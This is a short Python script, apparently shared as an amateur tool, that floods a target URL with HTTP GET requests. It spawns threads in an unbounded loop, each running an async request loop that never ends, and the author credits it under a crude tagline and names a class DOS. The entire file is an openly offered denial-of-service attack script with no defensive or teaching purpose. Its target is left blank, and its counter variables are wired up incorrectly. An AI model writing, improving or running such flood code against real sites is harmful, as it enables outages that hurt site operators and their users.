import threading
import aiohttp
import asyncio
import time
import os
import sys

url = ""

def credits():
	print("» DEVELOPED BY MAHIRO CHAN / YOUR SPERM WARRIOR x WANNABE PROGRAMMER")
	
def spamreq(url):
    num = 0
    reqs = []
    r = 0

    async def fetch(session, url):
        global r, reqs
        start = int(time.time())
        while True:
            try:
                async with session.get(url) as response:
                    if response:
                        set_end = int(time.time())
                        set_final = start - set_end
                        final = str(set_final).replace("-", "")

                        if response.status == 200:
                            r += 1
                        reqs.append(response.status)
                    else:
                        pass
            except Exception:
                pass

    async def main():
        async with aiohttp.ClientSession() as session:
            await fetch(session, url)

    def run():
        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(main())
        except Exception:
            pass

    class DOS:
        def __init__(self, url):
            self.url = url

        def start(self):
            while True:
                try:
                    th = threading.Thread(target=run)
                    th.start()
                except Exception:
                    pass

    dosmahiro = DOS(url)
    dosmahiro.start()

if __name__ == '__main__':
    spamreq(url)
